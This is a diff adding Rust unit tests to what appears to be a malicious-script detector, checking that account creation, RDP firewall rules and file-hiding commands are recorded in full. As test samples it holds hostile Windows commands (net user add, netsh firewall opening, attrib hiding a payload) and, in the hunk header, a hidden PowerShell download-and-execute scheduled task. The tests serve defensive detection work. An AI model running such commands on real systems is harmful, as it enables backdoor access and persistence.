@@ -2479,6 +2479,63 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn account_modification_preserves_full_command_context() {
+        let comment = "A".repeat(260);
+        let script = format!("net user support P@ssw0rd /add /comment:\"{comment}\"\r\n");
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+        let expected = script.trim_end();
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::AccountModification { action, account, command, .. }
+                    if action == "local-user-add"
+                        && account == "support"
+                        && command == expected
+            )),
+            "full account modification command was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn remote_access_preserves_full_command_context() {
+        let rule_name = format!("Remote Desktop {}", "A".repeat(240));
+        let script = format!(
+            "netsh advfirewall firewall add rule name=\"{rule_name}\" dir=in protocol=tcp localport=3389 action=allow\r\n"
+        );
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+        let expected = script.trim_end();
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, command, .. }
+                    if technique == "rdp-firewall-open" && command == expected
+            )),
+            "full remote access command was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn file_concealment_preserves_full_command_context() {
+        let path = format!(r#"C:\Users\Public\{}\payload.vbs"#, "A".repeat(240));
+        let script = format!("attrib +h +s \"{path}\"\r\n");
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+        let expected = script.trim_end();
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::FileConcealment { command, .. } if command == expected
+            )),
+            "full file concealment command was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn inmem_assembly_load_detected_in_extracted_ps_payload() {
         // SOSTENER/banglabillboard family: PS body decoded from base64
         // contains `[System.Reflection.Assembly]::Load(...)`. The
